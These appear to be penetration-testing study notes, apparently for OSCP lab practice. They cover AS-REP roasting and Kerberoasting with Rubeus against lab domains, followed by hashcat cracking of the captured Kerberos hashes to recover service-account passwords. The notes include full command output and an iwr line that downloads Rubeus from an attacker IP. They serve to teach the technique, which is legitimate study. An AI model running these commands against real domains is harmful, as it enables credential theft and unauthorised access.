
rubues.exe
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
## as-rep-roasting

performing this attack as a pre-authenticated domain user, we don't have to provide any other options to Rubeus except **asreproast**. Rubeus will automatically identify vulnerable user accounts. We also add the flag **/nowrap** to prevent new lines being added to the resulting AS-REP hashes.

```
PS C:\Users\jeff> cd C:\Tools

PS C:\Tools> .\Rubeus.exe asreproast /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: AS-REP roasting

[*] Target Domain          : corp.com

[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : dave
[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
[*] Using domain controller: DC1.corp.com (192.168.50.70)
[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$dave@corp.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB972506B4989E9ABA2899C042E66792F33B119FAB1837D94EB654883C6C3F2DB6D4A8D44A8D9531C2661BDA4DD231FA985D7003E91F804ECF5FFC0743333959470341032B146AB1DC9BD6B5E3F1C41BB02436D7181727D0C6444D250E255B7261370BC8D4D418C242ABAE9A83C8908387A12D91B40B39848222F72C61DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A
```
> Listing 17 - Using Rubeus to obtain the AS-REP hash of _dave_


Listing 17 shows that Rubeus identified _dave_ as vulnerable to AS-REP Roasting and displays the AS-REP hash.

Next, let's copy the AS-REP hash and paste it into a text file named **hashes.asreproast2** in the home directory of user _kali_. We can now start Hashcat again to crack the AS-REP hash.

```
kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...
$krb5asrep$dave@corp.com:ae43ca9011cc7e7b9e7f7e7279dd7f2e$7d4c59410de2984edf35053b7954e6dc9a0d16cb5be8e9dcacca88c3c13c4031abd71da16f476eb972506b4989e9aba2899c042e66792f33b119fab1837d94eb654883c6c3f2db6d4a8d44a8d9531c2661bda4dd231fa985d7003e91f804ecf5ffc0743333959470341032b146ab1dc9bd6b5e3f1c41bb02436d7181727d0c6444d250e255b7261370bc8d4d418c242abae9a83c8908387a12d91b40b39848222f72c61ded5349d984ffc6d2a06a3a5bc19ddff8a17ef5a22162baade9ca8e48dd2e87bb7a7ae0dbfe225d1e4a778408b4933a254c30460e4190c02588fbaded757aa87a:Flowers1
```

## kerberoast
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

```
PS C:\temp> iwr -uri http://192.168.45.175/Rubeus.exe -OutFile Rubeus.exe
iwr -uri http://192.168.45.175/Rubeus.exe -OutFile Rubeus.exe
PS C:\temp> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : oscp.exam
[*] Searching path 'LDAP://DC01.oscp.exam/DC=oscp,DC=exam' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 2


[*] SamAccountName         : sql_svc
[*] DistinguishedName      : CN=sql_svc,CN=Users,DC=oscp,DC=exam
[*] ServicePrincipalName   : MSSQL/MS02.oscp.exam
[*] PwdLastSet             : 12/5/2022 5:49:44 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\temp\hashes.kerberoast


[*] SamAccountName         : web_svc
[*] DistinguishedName      : CN=web_svc,CN=Users,DC=oscp,DC=exam
[*] ServicePrincipalName   : HTTP/MS01.oscp.exam
[*] PwdLastSet             : 11/10/2022 11:11:19 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\temp\hashes.kerberoast

[*] Roasted hashes written to : C:\temp\hashes.kerberoast
```

Showing
```
PS C:\temp> type hashes.kerberoast
type hashes.kerberoast
$krb5tgs$23$*sql_svc$oscp.exam$MSSQL/MS02.oscp.exam@oscp.exam*$1723359DF0B2FAC7CF7AD12EA41DBA63$DD60E085D0AE20ABD88B183AA65765FD1A4A18536A07CD487EAAC8B42462C6EDC839F287CE903A96D53BFB060A0E8EFDFA0B81995FCDB66E0EE02800283DC845F57489D16AE251166F56FB07E5FD5F6FAF2FF17761B2FE9F0242D2D4541508DE5CE982074AC7AF073CE30E9A0D9CD2D3ED3410E356B1D7B0DD663C1C0D54702A8157D349A629A516E93C3AA0C63AA36A3B1BB5F73C6BBFBB7C8839A6306FCB8ED357DA0AEC3A2A47EBA2D43C13A83679565157234F0CC5E3A411FD9FE2468679F7C2EFC02AD965694B204D40648E10D0223FC8C4CD27B9619AE8D8DBAA276E422921BE863D6F97F1B9EC7A36D6654BB2190608D5C5AB45DF05DCA8362FB85E2C7C4C0B3EF1A2EE46DF3597F1AC5FF8519A4972CA040CBD2F1816777BCA524928BE38BB31A64245A321A3D6FCE60AC979E8738F36E144E8D70CEC0F8EC09F46471038C76B22A6CD3F8C84238A7EED5CDDAE7419BEEF2E6721053503DD118EB02F3C4DF36315D7605B31D8E8AD84E6B1E1DE795B660E81D50FF0885E26CCC15C578B994E24C313FE58D0F512B4E9D8BEECB963FFF8063F9C4CE3D237ACCB3CD0E3FF6DE15FA686BDBEA21AF3F3FDF1D16527424053D3E3499C5D5997BA377241620592A8FCB557F132D2B183D659906C3293B7314F7C3F8D7814A34950374DA7856995ECF7A858B068B607B69B7D75799A0699F49463BC5F33011071799B4F4137F92584CB67ED37E352CF15B23195767F48FAC172168AF337AE9FF74F54FF21ABF85A734B5734A61F9A194200DC1BF5C09071299DC53CD0CF6A8D7B43891296B6ABDC4FDB9D6B9D87DF8C1BC6F6C9610B05F587F1583ADA3BE96ED0652FE11FEDCA79A1C3BBFFA9059AF0A88548ED7EC8F4B6C4E4764A8F5104C5B281626EFB60B00C575857DD6F3C880A62E4162E1B6DED54AA57DFF1F1B9F9FA96B8C5825C1F1A99B61B4EA4FA117A6D9CDF11D0CCA03D3428C10588834D558C0A98D6AFCCA466FEFE8CD3D88FBC3C9127F90E632349624766FDC0379B6E002AD0E77D71B60BAAC4C9F58F786C5D3E2FDCC393E39D47DC4449C43D91B3A7110862E7EA8A78182D320B9142A0FA0EC3CE461F5FF126D293FDE3A1A5DBD7FA4C37C98A12DFE4B402A0E0C344A2BE9700C1277193D500B336E42883CFD1443324D6DFD263EE75F213D8EA4FF4417FB364E58453DB827878F01041CF32DAEA56BFAE86126C88311F8AA2893B564CD7F0EB6192ADDFDA2AFBB1F8956D755AB0AF6F2B039F512281C4B72EF5264CDCB73C147BCB8968FFC35C696990D4E56984A2D566582CB866A02F2B1B9B5815BBF5E0B36BD715CD08C519D2C8FE4455AF3C2DBFA6C3AA1CA93C207BA5FDAEF0540C694FF545AB9E88CB8651E5B911EFD9CF73A6B30756FEB87ED3291CD33D0033B37D01DE0062B25BA1CBC13A6E99F36826EE7F14FF651962F83FA1CDF63DDA437F7B12F0F4BED383D069518E8AE743C38F326EE23B45E67137C6F4F9BCE9653CC28BD08CB98F20094938E5E85D74E9BE8EE08B
$krb5tgs$23$*web_svc$oscp.exam$HTTP/MS01.oscp.exam@oscp.exam*$7F4B76D74845353D6F84CDBA6D97BB21$F6FD04436942621E023A47B12C27E5C8AA6BBD3A65C2B792E38070A5C6335033149BC01D572736163B85954DC1D194ABE3FC58301287C4CE7368E71ABE6C69D9963C1CD537D223C21EEAB5C0115249B6A768D536D4E97FF1B9DB7C02D0DAC9078231F13C275847783E89E7215341A1970BE65B61C26FF2704522620BBE05BB5184BFC4C6DD26C1FD68014CDE5D15DB0AE0E9446567B736B0B3A410228915BC1C6BD3DC274D291A0069095FB5575B8881142BD1961F8A375AEBB724FEFF4CE967BFC5AE58703B0213C30EFF0D9EC9B3853CB3046711624BFD2127C8C04AAE673FAB89FB19DF06C9954ED2F27DC0D4E23492A46A6093166A26AEC377FE9A3E2E1048BFD75C8A4A3268F5A8BBFCE2C8E12278A78E22990BD3362CDBA5F008A2EAE25914BF274B5B758D18AE02901FD15AD7F99CE7F6957F29FD21BF5580CF0D30E0F19C792E61300550734ED065AFBD46039B6DA1D22CBA48953AA72E963ACBDE83AAC31B12E40DFA1D7CD0A4D612B2078B063434F8C263F69E9D8F50B818D1B35618D3E63A07A90BB5C1F5C6FE283D1657BFAFCDDCB66B478855221E3A517E1D18D4759BA80D4635F5ED2CADF48CF8419CA2E2AA470E9321050D1D8156DB306E297B5B8E190B089688D31DE3F0B7794959E57847427E5923101DA4BC5B3B6DABAD30535AC08E65AAB521DD81EE71E7117A8F700E5862EEB2E718C82CEEA96BC3961D69FBD1D22EF1FA55081564D4AA4503A71858520CC650062720A7A522A36A06B1EDFD23BBA8C975211A10550E8F86AE84AFF5CC2982C80235147241D59EC5C682C3CF989FB1A78E49EB6EFB666AC225F69C3A63E7B4ECE27A749D4B51C8E46DF6940ED6D256E343D9A04C40D785459B80DA4DDBAEEC84BFE3198AA6D6CF2387176A0A67523B528EC6784396C70A703EF1616BD66111CAFFBCAD7B295553C486F73C73122E3BCC22DF46BB42E30FC04612ADB1C7E74A2615048B463C34951A77482DBCB8964BF85D95A40DE2A2C0642F90BE8324B10C49E3EE3BF229AADD8FAB4D7C329C052C03429B82DA0B11680D05B3C7AB1BAEE38EC974C6C09DDE5605C35461AB8BA7D68ED54447A4EF0BCCBEC6CFD12094BBBF3BAA7FC3C9B5159DB4DB94AA65C99292299055BCA2D2AE2553FFA8B4873DD73D337BF62BEDCE772584B2B638D3E0DC89F47153D066359D76ECF7E31B372AFE9262689C5847EB7BF1E570CCE214F5B7C205FF3DE30030F509CDBAEF586C33778859420CB7FA89AA5DDC8A96602A7C677BEA247CA63AF5FAFC8C3E39E09F56769E254E021EB8C13ECE5DF643590FA384219CA76C82E8E29B2FE2C50FBCFC815DD8D6ED96F24AAA76E59362DD754CE473B1AAF1439B149B8C188D597362D3792801BFDCFA128F45427519CECA723B8958938A2E899B93FC4AE2DE6C6B210A644AAFCBB3D5B751B369948ACE26AA78C61F5B1D47CB5AE46DF79DC177D98D100586AB389E42D7989CA891E25276DB6A8BC8DBE777BE5302C7FAD55C05CFF9BAE8808A1C1287
```

Put it on my kali
```
┌──(kali㉿kali)-[~/OSCP-A/MS01-141]
└─$ nano hashes.kerberoast
```
using 13100 - > TGS-REP -> `krb5tgs$23$`
```
kali@kali:~$ hashcat --help | grep -i "Kerberos"         
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
```


Cracking
```
┌──(kali㉿kali)-[~/OSCP-A/MS01-141]
└─$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
[sudo] password for kali: 
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, 2553/5171 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 77

Optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 1104517645

$krb5tgs$23$*web_svc$oscp.exam$HTTP/MS01.oscp.exam@oscp.exam*$7f4b76d74845353d6f84cdba6d97bb21$f6fd04436942621e023a47b12c27e5c8aa6bbd3a65c2b792e38070a5c6335033149bc01d572736163b85954dc1d194abe3fc58301287c4ce7368e71abe6c69d9963c1cd537d223c21eeab5c0115249b6a768d536d4e97ff1b9db7c02d0dac9078231f13c275847783e89e7215341a1970be65b61c26ff2704522620bbe05bb5184bfc4c6dd26c1fd68014cde5d15db0ae0e9446567b736b0b3a410228915bc1c6bd3dc274d291a0069095fb5575b8881142bd1961f8a375aebb724feff4ce967bfc5ae58703b0213c30eff0d9ec9b3853cb3046711624bfd2127c8c04aae673fab89fb19df06c9954ed2f27dc0d4e23492a46a6093166a26aec377fe9a3e2e1048bfd75c8a4a3268f5a8bbfce2c8e12278a78e22990bd3362cdba5f008a2eae25914bf274b5b758d18ae02901fd15ad7f99ce7f6957f29fd21bf5580cf0d30e0f19c792e61300550734ed065afbd46039b6da1d22cba48953aa72e963acbde83aac31b12e40dfa1d7cd0a4d612b2078b063434f8c263f69e9d8f50b818d1b35618d3e63a07a90bb5c1f5c6fe283d1657bfafcddcb66b478855221e3a517e1d18d4759ba80d4635f5ed2cadf48cf8419ca2e2aa470e9321050d1d8156db306e297b5b8e190b089688d31de3f0b7794959e57847427e5923101da4bc5b3b6dabad30535ac08e65aab521dd81ee71e7117a8f700e5862eeb2e718c82ceea96bc3961d69fbd1d22ef1fa55081564d4aa4503a71858520cc650062720a7a522a36a06b1edfd23bba8c975211a10550e8f86ae84aff5cc2982c80235147241d59ec5c682c3cf989fb1a78e49eb6efb666ac225f69c3a63e7b4ece27a749d4b51c8e46df6940ed6d256e343d9a04c40d785459b80da4ddbaeec84bfe3198aa6d6cf2387176a0a67523b528ec6784396c70a703ef1616bd66111caffbcad7b295553c486f73c73122e3bcc22df46bb42e30fc04612adb1c7e74a2615048b463c34951a77482dbcb8964bf85d95a40de2a2c0642f90be8324b10c49e3ee3bf229aadd8fab4d7c329c052c03429b82da0b11680d05b3c7ab1baee38ec974c6c09dde5605c35461ab8ba7d68ed54447a4ef0bccbec6cfd12094bbbf3baa7fc3c9b5159db4db94aa65c99292299055bca2d2ae2553ffa8b4873dd73d337bf62bedce772584b2b638d3e0dc89f47153d066359d76ecf7e31b372afe9262689c5847eb7bf1e570cce214f5b7c205ff3de30030f509cdbaef586c33778859420cb7fa89aa5ddc8a96602a7c677bea247ca63af5fafc8c3e39e09f56769e254e021eb8c13ece5df643590fa384219ca76c82e8e29b2fe2c50fbcfc815dd8d6ed96f24aaa76e59362dd754ce473b1aaf1439b149b8c188d597362d3792801bfdcfa128f45427519ceca723b8958938a2e899b93fc4ae2de6c6b210a644aafcbb3d5b751b369948ace26aa78c61f5b1d47cb5ae46df79dc177d98d100586ab389e42d7989ca891e25276db6a8bc8dbe777be5302c7fad55c05cff9bae8808a1c1287:Diamond1
Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => 
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: hashes.kerberoast
Time.Started.....: Mon Sep 23 17:54:19 2024, (8 mins, 55 secs)
Time.Estimated...: Mon Sep 23 18:03:14 2024, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2108.3 kH/s (5.79ms) @ Accel:128 Loops:38 Thr:1 Vec:8
Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new), 1/2 (50.00%) Salts
Progress.........: 2209035290/2209035290 (100.00%)
Rejected.........: 0/2209035290 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:1 Amplifier:76-77 Iteration:0-38
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[2074656e616e] -> $HEX[04a156616d6f]
Hardware.Mon.#1..: Util: 91%

Started: Mon Sep 23 17:54:17 2024
Stopped: Mon Sep 23 18:03:15 2024
                                      
```
web_svc: Diamond1